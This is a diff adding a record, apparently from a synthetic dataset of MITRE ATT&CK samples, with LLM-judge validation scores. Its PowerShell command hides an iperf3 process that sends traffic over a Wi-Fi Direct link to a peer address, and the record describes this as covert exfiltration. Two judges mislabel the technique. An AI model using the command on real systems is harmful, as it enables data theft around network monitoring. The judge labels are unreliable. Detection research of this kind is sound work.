@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$wd=Get-NetAdapter -InterfaceDescription 'Microsoft Wi-Fi Direct Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wd.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 192.168.137.2 -p 64222 -B $ip -t 50\"",
+  "explanation": "Uses the Wi\u2011Fi Direct virtual adapter and binds iperf3 to it, sending over a peer\u2011to\u2011peer Wi\u2011Fi Direct link rather than the primary network (T1011).",
+  "rationale_steps": [
+    "Identify the Wi\u2011Fi Direct virtual adapter used for P2P links.",
+    "Get the adapter's assigned IPv4 address.",
+    "Run iperf3 bound to this interface on a high port for exfil.",
+    "Hide the process window to lower casual visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ce514a45",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes and parentheses, correct semicolon separators, and valid cmdlet and parameter usage.",
+        "semantic_score": 3,
+        "semantic_justification": "It correctly binds iperf3 to the Wi-Fi Direct adapter IP and initiates a client session over that link, but it does not package or transfer collected data nor implement automation typical of Automated Exfiltration.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T02:42:40.660609Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses, correct variable assignments, error handling with -ErrorAction, and proper command chaining.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements automated exfiltration (T1011) by using iperf3 to establish a covert data transfer channel over Wi-Fi Direct, bypassing the primary network and hiding the process window.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:42:43.495471Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell cmdlet syntax, valid parameter names, proper variable assignments, and balanced quotes and parentheses.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively identifies and leverages the Wi-Fi Direct virtual adapter to establish an automated, alternative data transfer channel using iperf3, demonstrating the core mechanism of bypassing primary networks for exfiltration as described in T1011, though iperf3 itself transmits test data rather than arbitrary collected files.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:43:04.442772Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
